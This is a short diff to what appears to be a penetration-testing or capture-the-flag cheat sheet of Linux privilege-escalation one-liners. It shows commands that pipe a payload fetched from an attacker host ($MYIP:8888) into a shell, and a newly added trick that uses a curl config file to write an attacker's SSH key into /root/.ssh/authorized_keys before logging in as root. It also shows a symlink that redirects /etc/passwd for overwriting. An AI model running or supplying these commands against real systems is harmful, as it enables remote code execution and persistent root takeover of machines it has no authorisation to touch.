@@ -1429,6 +1429,11 @@ echo -e 'const { exec } = require('child_process');\nexec('curl $MYIP:8888/resh_
 echo -e '#!/bin/bash\ncurl $MYIP:8888/resh_5566|sh'
 echo 'bash -i'
 
+-->> curl cmd file
+echo -e 'url = "http://$MYIP:8888/ssh.pub"\noutput = "/root/.ssh/authorized_keys"' > /dev/shm/cmd
+curl -s -K /dev/shm/cmd
+ssh -i ~/.ssh/ssh.key root@$TARGET
+
 +---------- Symlink: Writeable Root File ----------+
 ln -sf /etc/passwd /var/log/below/error_root.log
 
